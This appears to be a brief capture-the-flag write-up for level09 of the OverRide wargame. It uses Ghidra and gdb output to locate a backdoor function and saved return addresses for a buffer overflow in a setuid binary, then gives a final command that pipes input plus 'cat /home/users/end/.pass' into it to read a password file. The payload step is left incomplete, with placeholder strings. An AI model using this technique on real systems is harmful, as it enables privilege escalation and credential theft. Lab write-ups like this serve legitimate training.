### step 1: Decompile with Ghydra

- Binary in 64-bits

```
level09@OverRide:~$ file level09 
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
```

- Sources are available in `source.c`


### step 2: Code Analysis

- find secret backdoor function address : `0x000055555555488c`
- find eip of set_username : `0x7fffffffe4f8`  and set_msg : `0x7fffffffe4f8`
 
```
gdb level09
b set_username
c
info frame
(gdb) info frame
Stack level 0, frame at 0x7fffffffe500:
 rip = 0x5555555549d1 in set_username; saved rip 0x555555554915
 called by frame at 0x7fffffffe5d0
 Arglist at 0x7fffffffe4f0, args: 
 Locals at 0x7fffffffe4f0, Previous frame's sp is 0x7fffffffe500
 Saved registers:
  rbp at 0x7fffffffe4f0, rip at 0x7fffffffe4f8
```

```
Breakpoint 4, 0x0000555555554936 in set_msg ()
(gdb) info frame
Stack level 0, frame at 0x7fffffffe500:
 rip = 0x555555554936 in set_msg; saved rip 0x555555554924
 called by frame at 0x7fffffffe5d0
 Arglist at 0x7fffffffe4f0, args: 
 Locals at 0x7fffffffe4f0, Previous frame's sp is 0x7fffffffe500
 Saved registers:
  rbp at 0x7fffffffe4f0, rip at 0x7fffffffe4f8
```


- find address of ref : 
```
(gdb) x $rdi
0x7fffffffe500:	0x0000000a
(gdb) x $rax
0x7fffffffe500:	0x0000000a
```

- find offset between ref and eip address

dépasse sur message au 128 eme char dans username
final string : 
(python -c 'print("hhshs")' ; python -c 'print("hhshs")'; echo 'cat /home/users/end/.pass'; cat) | ./level09
